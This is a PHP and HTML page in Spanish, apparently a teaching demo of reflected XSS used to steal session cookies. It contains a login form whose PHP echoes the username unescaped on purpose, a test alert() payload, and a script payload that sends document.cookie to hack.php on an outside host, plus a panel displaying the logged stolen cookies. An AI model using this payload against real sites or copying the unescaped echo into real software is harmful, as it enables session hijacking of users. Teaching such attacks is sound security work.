<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>XSS Cookie Stealer</title>

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/octicons/3.1.0/octicons.min.css">
    <link rel="stylesheet" href="./style.css">

    <!--[if lt IE 9]>
      <script src="https://cdn.jsdelivr.net/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://cdn.jsdelivr.net/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>

<body>
  <?php session_start();
  if (isset($_REQUEST["usuario"]) && isset($_REQUEST["contrasena"])){
    session_start();
    $_SESSION["usuario"] = $_REQUEST["usuario"];
  }
  ?>
    <div class="container">

        <h1>Ejemplo de vulnerabilidad de XSS<small> basado en el robo de Cookies</small></h1>
<div class="alert alert-warning">
          IMPORTANTE: Si en l url del servidor aparece un candado o y "https" precendiendo al URL, visita la web <a href="http://xss-cookies.000webhostapp.com/index.php
">aquí</a>, ya que cuando se utiliza https, las conexiones van cifradas, y por tanto las cookies no se pueden robar.
        </div>
        <p>
            En el siguiente formulario, se le pide al usuario que introduzca sus credenciales. Este formulario se encuentra en un servidor desarrollado en PHP, vulnerable a XSS. De esta manera se mostrará como aprovechar esta situación con el fin de robar las cookies
            proporcionadas al usuario al iniciar sesión.
        </p>
        <p>
          Para demostrar que efectivamente el formulario es vulnerable, barsaría con introducir el siguiente texto en el campo de Usuario:
        </p>
        <p>
          <code>&lt;script&gt; alert("Hello")  &lt;/script&gt;</code>, en caso de que no funcione, provar a introducir <code>&gt;"&lt;script&gt; alert("Hello")  &lt;/script&gt;</code>.
        </p>
<p>
  Ahora, con el fin de cumplir con el papel de un atacante, utilizaremos un comando con un script que le permite al atacante guardar la cookie de sesion del usuario logueado en su servidor privado. Para poder ejecutar el comando aprovechamos la vulnerabilidad de XSS que nos permite que el servidor renderice el contenido y así se ejecute por nosotros:
</p>
<p>
  <code>"&gt;&lt;script type="text/javascript"&gt;document.location="http:///xss-cookies.000webhostapp.com/hack.php?cookie=" + document.cookie;document.location="http:///xss-cookies.000webhostapp.com/index.php"&lt;/script&gt;</code>
</p>

<div class="alert alert-info">
  AVISO: Tanto en Chrome como en Safari existe un módulo llamado XSS Auditor que protege al navegador de ataques XSS. Por lo tanto, si se quiere probar los ejemplos aquí propuestos será mejor que no se utilice ninguno de los dos navegadores.
</div>

    </div>
    <div class="container" style="margin-top:40px">
        <div class="row">
            <div class="col-sm-6 col-md-4 col-md-offset-4">
                <div class="panel panel-default">
                    <div class="panel-heading">
                        <strong> Introduce tus credenciales para acceder</strong>
                    </div>
                    <div class="panel-body">
                        <form role="form" action="./index.php" method="POST">
                            <fieldset>
                                <div class="row">
                                    <div class="center-block">
                                        <img class="profile-img" src="./avatar.png" alt="">
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-sm-12 col-md-10  col-md-offset-1 ">
                                        <div class="form-group">
                                            <div class="input-group">
                                                <span class="input-group-addon">
  													<i class="glyphicon glyphicon-user"></i>
  												</span>
                                                <input id="in_usr" class="form-control" placeholder="Usuario" name="usuario" type="text" autofocus>
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <div class="input-group">
                                                <span class="input-group-addon">
  													<i class="glyphicon glyphicon-lock"></i>
  												</span>
                                                <input id="in_pass" class="form-control" placeholder="Contraseña" name="contrasena" type="password" value="">
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <input type="submit" onclick="checkCredentials()" class="btn btn-lg btn-primary btn-block" value="Dame Cookie">
                                        </div>
                                    </div>
                                </div>
                            </fieldset>
                        </form>
                        <?php if (isset($_SESSION["usuario"])): ?>
                          <form action="./quitaCookie.php" method="post">
                          <input type="submit" class="btn btn-lg btn-default btn-block"name="button" value="Quitar Cookie"/>
                          </form>
                        <?php endif; ?>

                    </div>
                    <div class="panel-footer ">
                        Mira el código fuente en <a href="#"> GitHub</a>!
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container alert alert-warning">
    <h4 class="text-center">
      <?php
      if (isset($_SESSION["usuario"])) {
        echo "Ya tienes Cookie";
        if (isset($_REQUEST["usuario"])) {
          echo ", eres " . $_REQUEST["usuario"];
        }
      } else {
        echo "Todavía no tienes Cookie";
      }
      ?>
  </h4>
  </div>
    <div class="container">
      <h3>Aquí se puede ver las cookies almacenadas en el servidor del atacante.</h3>
    </div>
    <div class="container">
      <div class="jumbotron">
        <div class="console">
          <?php
          $fh = fopen('log.txt','r');
          while ($line = fgets($fh)) {
            // <... Do your work with the line ...>
            echo($line);
            echo "<br>";
          }
  fclose($fh);
  ?>
        </div>
      </div>
    </div>

    <script src="https://cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/bootstrap/3.3.5/js/bootstrap.min.js"></script>
    <script type="text/javascript">
      function checkCredentials() {
        var val1 = $("#in_usr").val();
        var val2 = $("#in_pass").val();

        if (!val1 || !val2) {
          alert('Introduce los credenciales.');
          return false;
        }
          return false;
      }
    </script>
</body>
</html>